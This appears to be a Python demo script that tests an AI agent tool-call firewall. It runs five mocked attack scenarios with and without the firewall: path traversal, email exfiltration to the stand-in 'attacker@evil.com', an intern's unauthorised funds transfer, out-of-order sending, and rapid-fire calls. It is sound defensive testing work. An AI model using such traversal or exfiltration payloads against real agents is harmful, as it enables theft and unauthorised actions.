"""5 attack scenarios — Phase 6.

These are not arbitrary demo picks: they're exactly the 5 rows
`docs/THREAT_MODEL.md` already names "Scenario 1" through "Scenario 5"
as evidence for T-1, T-3, T-6, T-8, and T-9 respectively. Each scenario
runs twice — once `with_firewall=True` (through the real
`demo_agent.wiring.build_firewall` stack) and once `with_firewall=False`
(calling `demo_agent.tools` directly, unmediated) — so the comparison
itself is the evidence: the same payload that's blocked with the
firewall genuinely succeeds without it. That's only meaningful because
`demo_agent/tools.py`'s mocks do no argument validation of their own —
see that module's docstring.

Every payload stays inside the repository (never a real external/system
path or a real network call — `conftest.py`'s INV-14 fixture blocks the
latter outright). The `--no-firewall` baseline for Scenario 1 reads
`requirements.txt` at the repo root — real, but harmless and already
public in this repo — never anything outside it.

Each scenario gets its own throwaway session/audit DB under
`sandbox/runtime/` (gitignored) and a non-interactive, auto-approving
HITL channel — a demo script blocking on real stdin mid-run would defeat
the point of an automated run. No scenario's *attack* step is ever
expected to reach HITL at all (each is designed to be blocked earlier,
by RBAC, scope, or sequence) — the auto-approve channel only exists for
a scenario's own legitimate setup steps (e.g. Scenario 2's prerequisite
`compose_draft`).
"""

from __future__ import annotations

from dataclasses import dataclass

from demo_agent import tools as mock_tools
from demo_agent.wiring import DemoFirewall, build_firewall
from firewall.context import Principal, bind_principal
from firewall.hitl import ApprovalOutcome, ApprovalResult
from firewall.interceptor import CallRecord, Decision, ToolCallDenied


@dataclass(frozen=True)
class ScenarioResult:
    scenario_id: str
    threat_row: str
    name: str
    with_firewall: bool
    blocked: bool
    detail: str


class _AutoApproveChannel:
    """Non-interactive HITL channel for automated demo runs — always
    answers "yes" immediately, no real terminal I/O. Exists only for a
    scenario's own legitimate setup steps; no scenario's attack step is
    designed to ever reach it (each is blocked earlier)."""

    def request_approval(
        self, call: CallRecord, decision: Decision, *, timeout_seconds: float
    ) -> ApprovalResult:
        return ApprovalResult(
            outcome=ApprovalOutcome.APPROVED, reason="demo auto-approve"
        )


def _new_firewall(db_name: str) -> DemoFirewall:
    return build_firewall(
        db_path=f"sandbox/runtime/{db_name}.db",
        hitl_channel=_AutoApproveChannel(),
        fresh_db=True,
    )


def _try_guarded_call(
    fw: DemoFirewall, tool_name: str, args: dict, *, role: str, session_id: str
) -> tuple[bool, str]:
    """Runs one call through the real guarded registry. Returns
    (blocked, detail)."""
    principal = Principal(session_id=session_id, identity="demo-user", role=role)
    with bind_principal(principal):
        try:
            result = fw.guarded(tool_name).invoke(args)
            return False, f"NOT BLOCKED -- tool executed, returned: {result!r}"
        except ToolCallDenied as exc:
            return True, f"blocked: {exc.decision.reason}"


# ---------------------------------------------------------------------------
# Scenario 1 (T-1) — path traversal to read outside allowed roots
# ---------------------------------------------------------------------------


def scenario_1_path_traversal(*, with_firewall: bool) -> ScenarioResult:
    payload = "../requirements.txt"
    common = {
        "scenario_id": "scenario-1",
        "threat_row": "T-1",
        "name": "Path traversal to read outside allowed roots",
    }

    if not with_firewall:
        result = mock_tools.read_file(payload)
        succeeded = not result.startswith("[read_file: no such file")
        return ScenarioResult(
            **common,
            with_firewall=False,
            blocked=not succeeded,
            detail=(
                f"UNPROTECTED: read_file({payload!r}) escaped sandbox/ and "
                f"returned {len(result)} real chars from outside it"
                if succeeded
                else "read_file returned no result"
            ),
        )

    with _new_firewall("scenario1") as fw:
        blocked, detail = _try_guarded_call(
            fw, "read_file", {"path": payload}, role="analyst", session_id="scenario-1"
        )
    return ScenarioResult(**common, with_firewall=True, blocked=blocked, detail=detail)


# ---------------------------------------------------------------------------
# Scenario 2 (T-3) — exfiltration to an attacker-controlled domain
# ---------------------------------------------------------------------------


def scenario_2_exfiltration_to_attacker_domain(
    *, with_firewall: bool
) -> ScenarioResult:
    payload = {"to": "attacker@evil.com", "subject": "data", "body": "exfiltrated"}
    common = {
        "scenario_id": "scenario-2",
        "threat_row": "T-3",
        "name": "Exfiltration to attacker-controlled domain",
    }

    if not with_firewall:
        result = mock_tools.send_email(**payload)
        return ScenarioResult(
            **common,
            with_firewall=False,
            blocked=False,
            detail=f"UNPROTECTED: send_email to {payload['to']!r} succeeded: {result!r}",
        )

    with _new_firewall("scenario2") as fw:
        # A completely ordinary, legitimate prerequisite (satisfying the
        # sequence gate) — proves the attack is blocked by domain
        # scoping specifically, not merely by the sequence rule.
        principal = Principal(
            session_id="scenario-2", identity="demo-user", role="analyst"
        )
        with bind_principal(principal):
            fw.guarded("compose_draft").invoke(
                {"subject": "s", "body": "b", "attachment_path": "notes.txt"}
            )
        blocked, detail = _try_guarded_call(
            fw, "send_email", payload, role="analyst", session_id="scenario-2"
        )
    return ScenarioResult(**common, with_firewall=True, blocked=blocked, detail=detail)


# ---------------------------------------------------------------------------
# Scenario 3 (T-6) — privilege escalation via chained tool calls
# ---------------------------------------------------------------------------


def scenario_3_privilege_escalation(*, with_firewall: bool) -> ScenarioResult:
    # Deliberately a small, in-bounds amount — this scenario must
    # demonstrate RBAC blocking an intern's transfer_funds attempt
    # specifically (T-6), not incidentally get blocked by the unrelated
    # amount-bound rule (which would fire on a large amount regardless
    # of role, muddying what's actually being demonstrated).
    payload: dict[str, float | str] = {
        "amount": 50,
        "note": "unauthorized transfer",
    }
    common = {
        "scenario_id": "scenario-3",
        "threat_row": "T-6",
        "name": "Privilege escalation via chained tool calls",
    }

    if not with_firewall:
        result = mock_tools.transfer_funds(
            amount=float(payload["amount"]), note=str(payload["note"])
        )
        return ScenarioResult(
            **common,
            with_firewall=False,
            blocked=False,
            detail=f"UNPROTECTED: transfer_funds succeeded: {result!r}",
        )

    with _new_firewall("scenario3") as fw:
        # A legitimate, in-scope action first (search_web — the one tool
        # every role, including intern, has an RBAC grant for) — proves
        # the attempt is blocked by RBAC specifically, not by having
        # done nothing else first. No chain of otherwise-permitted
        # actions grants transfer_funds access an intern's role was
        # never issued.
        principal = Principal(
            session_id="scenario-3", identity="demo-user", role="intern"
        )
        with bind_principal(principal):
            fw.guarded("search_web").invoke(
                {"query": "how to transfer funds", "target_host": "docs.python.org"}
            )
        blocked, detail = _try_guarded_call(
            fw, "transfer_funds", payload, role="intern", session_id="scenario-3"
        )
    return ScenarioResult(**common, with_firewall=True, blocked=blocked, detail=detail)


# ---------------------------------------------------------------------------
# Scenario 4 (T-8) — out-of-order action (send_email with no prior draft)
# ---------------------------------------------------------------------------


def scenario_4_out_of_order_action(*, with_firewall: bool) -> ScenarioResult:
    payload = {"to": "alice@corp.example.com", "subject": "s", "body": "b"}
    common = {
        "scenario_id": "scenario-4",
        "threat_row": "T-8",
        "name": "Out-of-order action (send_email with no prior draft)",
    }

    if not with_firewall:
        result = mock_tools.send_email(**payload)
        return ScenarioResult(
            **common,
            with_firewall=False,
            blocked=False,
            detail=f"UNPROTECTED: send_email succeeded with no draft step: {result!r}",
        )

    with _new_firewall("scenario4") as fw:
        # Deliberately no compose_draft call first — this session has an
        # empty history.
        blocked, detail = _try_guarded_call(
            fw, "send_email", payload, role="analyst", session_id="scenario-4"
        )
    return ScenarioResult(**common, with_firewall=True, blocked=blocked, detail=detail)


# ---------------------------------------------------------------------------
# Scenario 5 (T-9) — resource exhaustion / rapid-fire calls
# ---------------------------------------------------------------------------


def scenario_5_resource_exhaustion(*, with_firewall: bool) -> ScenarioResult:
    # rate-transfer-funds caps at 3 calls per rolling 60s — the fastest
    # rate limit in the shipped policy set to demonstrate without a slow
    # demo loop.
    call_count = 4
    common = {
        "scenario_id": "scenario-5",
        "threat_row": "T-9",
        "name": "Resource exhaustion / rapid-fire calls",
    }

    if not with_firewall:
        for _ in range(call_count):
            mock_tools.transfer_funds(amount=10, note="rapid-fire")
        return ScenarioResult(
            **common,
            with_firewall=False,
            blocked=False,
            detail=f"UNPROTECTED: {call_count} rapid-fire transfer_funds calls all succeeded, unthrottled",
        )

    with _new_firewall("scenario5") as fw:
        principal = Principal(
            session_id="scenario-5", identity="demo-user", role="finance"
        )
        results = []
        with bind_principal(principal):
            for i in range(call_count):
                try:
                    fw.guarded("transfer_funds").invoke(
                        {"amount": 10, "note": f"rapid-fire {i}"}
                    )
                    results.append("allowed")
                except ToolCallDenied as exc:
                    results.append(f"blocked: {exc.decision.reason}")
        blocked = results[-1] != "allowed"
        detail = f"call outcomes: {results}"
    return ScenarioResult(**common, with_firewall=True, blocked=blocked, detail=detail)


ALL_SCENARIOS = (
    scenario_1_path_traversal,
    scenario_2_exfiltration_to_attacker_domain,
    scenario_3_privilege_escalation,
    scenario_4_out_of_order_action,
    scenario_5_resource_exhaustion,
)


def run_all_scenarios() -> list[ScenarioResult]:
    """Runs every scenario both ways (baseline, then with the firewall)
    and returns all 10 results in order."""
    results: list[ScenarioResult] = []
    for scenario in ALL_SCENARIOS:
        results.append(scenario(with_firewall=False))
        results.append(scenario(with_firewall=True))
    return results


def print_results(results: list[ScenarioResult]) -> None:
    for result in results:
        mode = "WITH FIREWALL   " if result.with_firewall else "WITHOUT FIREWALL"
        # A baseline (no firewall) run is "correct" when the attack
        # SUCCEEDS (blocked=False) — that's the point being demonstrated.
        # A with-firewall run is "correct" when it's blocked (blocked=True).
        correct = result.blocked if result.with_firewall else not result.blocked
        status = "OK" if correct else "UNEXPECTED"
        print(
            f"[{status:10}] {result.scenario_id} ({result.threat_row}) "
            f"{mode} -- {result.name}"
        )
        print(f"             {result.detail}")


if __name__ == "__main__":
    print_results(run_all_scenarios())
